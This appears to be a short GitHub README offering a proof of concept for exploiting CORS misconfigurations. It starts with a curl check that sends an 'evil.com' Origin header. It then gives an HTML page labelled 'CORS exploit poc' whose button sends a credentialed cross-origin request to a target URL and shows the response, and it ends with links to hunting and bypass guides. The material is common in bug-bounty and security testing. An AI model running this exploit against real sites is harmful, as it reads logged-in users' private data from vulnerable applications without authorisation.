# CORS poc

Testing: curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'

Check to see what the server responds with in the Access-Control-Allow-Origin: (if anything) and if so, check if Access-Control-Allow-Credentials: true is present.

If it is trusting arbitrary origins with allow-credentials set to true, then host this HTML as a proof of concept.

# code


<!DOCTYPE html>
<html>
<body>
<center>
<h1 style="color:black;">CORS exploit poc</h1>
<h2 style="color:red;">Sensitive credentials</h2>
<body style="background-color:white;">
  <body background="https://www.keycdn.com/img/support/cors.png"
  
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("GET", "https://target.com/URL", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
 
</body>
</html>


# usage

open cors.html in your broswer

# everything you need to know about CORS

![IMG_20210702_133115](https://user-images.githubusercontent.com/83821864/124244349-7b6a0b00-db3c-11eb-88d3-bf53483e6331.jpg)


> what is CORS:     https://portswigger.net/web-security/cors

> how to hunt CORS: https://github.com/KathanP19/HowToHunt/tree/master/CORS

> CORS bypass:      https://book.hacktricks.xyz/pentesting-web/cors-bypass

> tools:            https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration

